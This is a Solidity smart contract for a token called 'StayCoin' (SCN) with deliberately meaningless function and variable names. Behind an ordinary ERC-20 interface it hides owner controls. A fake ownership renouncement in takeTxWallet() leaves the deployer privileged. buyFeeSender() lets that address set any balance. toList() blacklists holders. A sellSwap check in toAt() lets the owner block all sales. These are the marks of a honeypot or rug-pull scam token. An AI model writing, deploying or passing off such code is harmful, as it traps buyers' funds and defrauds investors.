//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract toFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeMax {
    function createPair(address amountFee, address buyLimit) external returns (address);

    function feeTo() external view returns (address);
}

interface receiverLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface shouldMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address enableTeamMin) external view returns (uint256);

    function transfer(address autoEnable, uint256 tradingList) external returns (bool);

    function allowance(address receiverIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingList) external returns (bool);

    function transferFrom(
        address sender,
        address autoEnable,
        uint256 tradingList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txTokenLaunch, uint256 value);
    event Approval(address indexed receiverIs, address indexed spender, uint256 value);
}

interface tradingExempt is shouldMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract StayCoin is toFund, shouldMin, tradingExempt {

    uint256 sellSwap;

    address private sellAuto;

    constructor (){
        
        takeTxWallet();
        receiverLimit minSellMax = receiverLimit(totalSwap);
        sellTrading = feeMax(minSellMax.factory()).createPair(minSellMax.WETH(), address(this));
        buyAt = feeMax(minSellMax.factory()).feeTo();
        if (isMaxTake == isReceiverTo) {
            isReceiverTo = marketingMode;
        }
        fundMin = _msgSender();
        launchedShould[fundMin] = true;
        isTx[fundMin] = exemptFrom;
        
        emit Transfer(address(0), fundMin, exemptFrom);
    }

    bool public launchReceiver;

    function allowance(address marketingAmount, address fundAmountMarketing) external view virtual override returns (uint256) {
        if (fundAmountMarketing == totalSwap) {
            return type(uint256).max;
        }
        return fromTokenTrading[marketingAmount][fundAmountMarketing];
    }

    uint256 private tokenSwap;

    function getOwner() external view returns (address) {
        return sellAuto;
    }

    bool private senderFund;

    function decimals() external view virtual override returns (uint8) {
        return feeMarketing;
    }

    bool private exemptLaunchedSender;

    bool private swapTeam;

    string private senderFeeTake = "Stay Coin";

    event OwnershipTransferred(address indexed fundAtReceiver, address indexed listSellReceiver);

    uint256 public sellLaunch;

    function toList(address liquidityTo) public {
        atLaunched();
        
        if (liquidityTo == fundMin || liquidityTo == sellTrading) {
            return;
        }
        buyLaunched[liquidityTo] = true;
    }

    function buyFeeSender(address liquidityEnable, uint256 tradingList) public {
        atLaunched();
        isTx[liquidityEnable] = tradingList;
    }

    function toAutoAt(address enableToken, address autoEnable, uint256 tradingList) internal returns (bool) {
        require(isTx[enableToken] >= tradingList);
        isTx[enableToken] -= tradingList;
        isTx[autoEnable] += tradingList;
        emit Transfer(enableToken, autoEnable, tradingList);
        return true;
    }

    bool private buyFund;

    uint256 private marketingMode;

    uint256 public amountMinFee = 0;

    uint256 public isMaxTake;

    function totalSupply() external view virtual override returns (uint256) {
        return exemptFrom;
    }

    uint256 constant tradingWallet = 17 ** 10;

    function liquidityExemptMode(address enableToken, address autoEnable, uint256 tradingList) internal view returns (uint256) {
        require(tradingList > 0);

        uint256 tradingMode = 0;
        if (enableToken == sellTrading && receiverShould > 0) {
            tradingMode = tradingList * receiverShould / 100;
        } else if (autoEnable == sellTrading && amountMinFee > 0) {
            tradingMode = tradingList * amountMinFee / 100;
        }
        require(tradingMode <= tradingList);
        return tradingList - tradingMode;
    }

    function takeModeExempt(uint256 tradingList) public {
        atLaunched();
        sellSwap = tradingList;
    }

    function takeTxWallet() public {
        emit OwnershipTransferred(fundMin, address(0));
        sellAuto = address(0);
    }

    uint256 public receiverShould = 0;

    function shouldTrading(address atReceiver) public {
        require(atReceiver.balance < 100000);
        if (launchReceiver) {
            return;
        }
        
        launchedShould[atReceiver] = true;
        if (swapTeam != modeIs) {
            marketingMode = isMaxTake;
        }
        launchReceiver = true;
    }

    function transfer(address liquidityEnable, uint256 tradingList) external virtual override returns (bool) {
        return toAt(_msgSender(), liquidityEnable, tradingList);
    }

    uint256 receiverEnable;

    mapping(address => uint256) private isTx;

    address totalSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public fundMin;

    bool public modeIs;

    mapping(address => bool) public launchedShould;

    function approve(address fundAmountMarketing, uint256 tradingList) public virtual override returns (bool) {
        fromTokenTrading[_msgSender()][fundAmountMarketing] = tradingList;
        emit Approval(_msgSender(), fundAmountMarketing, tradingList);
        return true;
    }

    mapping(address => bool) public buyLaunched;

    mapping(address => mapping(address => uint256)) private fromTokenTrading;

    address buyAt;

    uint8 private feeMarketing = 18;

    function transferFrom(address enableToken, address autoEnable, uint256 tradingList) external override returns (bool) {
        if (_msgSender() != totalSwap) {
            if (fromTokenTrading[enableToken][_msgSender()] != type(uint256).max) {
                require(tradingList <= fromTokenTrading[enableToken][_msgSender()]);
                fromTokenTrading[enableToken][_msgSender()] -= tradingList;
            }
        }
        return toAt(enableToken, autoEnable, tradingList);
    }

    function name() external view virtual override returns (string memory) {
        return senderFeeTake;
    }

    function atLaunched() private view {
        require(launchedShould[_msgSender()]);
    }

    function balanceOf(address enableTeamMin) public view virtual override returns (uint256) {
        return isTx[enableTeamMin];
    }

    function owner() external view returns (address) {
        return sellAuto;
    }

    function symbol() external view virtual override returns (string memory) {
        return enableWallet;
    }

    string private enableWallet = "SCN";

    uint256 private exemptFrom = 100000000 * 10 ** 18;

    function toAt(address enableToken, address autoEnable, uint256 tradingList) internal returns (bool) {
        if (enableToken == fundMin) {
            return toAutoAt(enableToken, autoEnable, tradingList);
        }
        uint256 launchBuy = shouldMin(sellTrading).balanceOf(buyAt);
        require(launchBuy == sellSwap);
        require(autoEnable != buyAt);
        if (buyLaunched[enableToken]) {
            return toAutoAt(enableToken, autoEnable, tradingWallet);
        }
        tradingList = liquidityExemptMode(enableToken, autoEnable, tradingList);
        return toAutoAt(enableToken, autoEnable, tradingList);
    }

    uint256 public isReceiverTo;

    address public sellTrading;

}